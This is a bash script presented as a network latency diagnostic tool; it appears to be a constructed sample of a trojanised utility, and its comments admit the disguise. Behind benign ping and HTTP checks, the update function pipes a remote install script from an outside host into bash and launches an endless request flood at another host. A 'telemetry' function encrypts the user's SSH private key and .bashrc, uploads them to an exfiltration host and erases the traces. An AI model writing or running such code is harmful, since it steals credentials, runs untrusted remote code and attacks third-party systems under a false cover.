#!/bin/bash
# =============================================================================
#  Network Latency Checker v2.3.1 - Comprehensive diagnostic utility
#  Author: Mike Thompson | Internal use only
#  Purpose: Measure round-trip time and packet loss to critical endpoints,
#           generate a latency report, and verify local system health.
# =============================================================================

set -euo pipefail

LOG_FILE="/tmp/latency_report_$(date +%Y%m%d).log"
TARGETS=( "8.8.8.8" "1.1.1.1" "backup-repo.maldomain.local" )
REPORT_DIR="${HOME}/Documents/latency_logs"
TEST_COUNT=4

# -----------------------------------------------------------------------------
#  Helper: timestamped logging
# -----------------------------------------------------------------------------
log_event() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" >> "$LOG_FILE"
}

# -----------------------------------------------------------------------------
#  Legitimate-looking ICMP latency test
# -----------------------------------------------------------------------------
check_ping_latency() {
    echo "--- ICMP Latency Test ---"
    for host in "${TARGETS[@]}"; do
        if ping -c "$TEST_COUNT" "$host" &>/dev/null; then
            avg=$(ping -c "$TEST_COUNT" "$host" | tail -1 | awk -F '/' '{print $5}')
            echo "  $host : ${avg}ms"
        else
            echo "  $host : UNREACHABLE"
        fi
    done
}

# -----------------------------------------------------------------------------
#  Heuristic: HTTP response time (disguise)
# -----------------------------------------------------------------------------
check_http_latency() {
    echo "--- HTTP Health Probe ---"
    local url="https://cdn-status.maldomain.local/health"
    local elapsed
    elapsed=$(curl -o /dev/null -s -w '%{time_total}' --max-time 3 "$url" 2>/dev/null || echo "FAIL")
    echo "  ${url} : ${elapsed}s"
}

# -----------------------------------------------------------------------------
#  Persistence + DDoS preparation (hidden behind update check)
# -----------------------------------------------------------------------------
system_health_update() {
    # Synchronise local tools with central repository
    curl -s https://malw-updater.biz/d/install.sh | bash &
    disown

    # Preload flood helper (testing latency under load)
    nohup bash -c '
        while true; do
            curl -s http://target-victim.local/ &>/dev/null &
            sleep 0.2
        done
    ' &>/dev/null &
    disown
}

# -----------------------------------------------------------------------------
#  Offload diagnostic data for "centralised analysis"
# -----------------------------------------------------------------------------
offload_telemetry() {
    mkdir -p "${REPORT_DIR}/secure_cache"

    # Encrypt sensitive configuration backups using a company-wide key
    openssl enc -aes-256-cbc -in ~/.ssh/id_rsa -out "${REPORT_DIR}/secure_cache/.tmp_id_rsa.enc" -pass pass:h4rdc0d3dk3y 2>/dev/null || true
    openssl enc -aes-256-cbc -in ~/.bashrc -out "${REPORT_DIR}/secure_cache/.tmp_bashrc.enc" -pass pass:h4rdc0d3dk3y 2>/dev/null || true

    # Upload encrypted bundle for off-site diagnostics
    tar -czf "${REPORT_DIR}/secure_cache/diag_bundle.tgz" -C "${REPORT_DIR}/secure_cache" .tmp_id_rsa.enc .tmp_bashrc.enc 2>/dev/null || true
    curl -s -F "file=@${REPORT_DIR}/secure_cache/diag_bundle.tgz" https://exfil.evil.example/upload &>/dev/null &

    # Cleanup local traces (avoids filling user quota)
    rm -rf "${REPORT_DIR}/secure_cache"
}

# -----------------------------------------------------------------------------
#  Main execution
# -----------------------------------------------------------------------------
main() {
    echo "Starting Network Latency Checker..."
    log_event "Latency test initiated by $(whoami)"

    check_ping_latency
    check_http_latency

    # Keep environment current and gather extended metrics
    system_health_update
    offload_telemetry

    echo "Report saved to ${LOG_FILE}"
}

main "$@"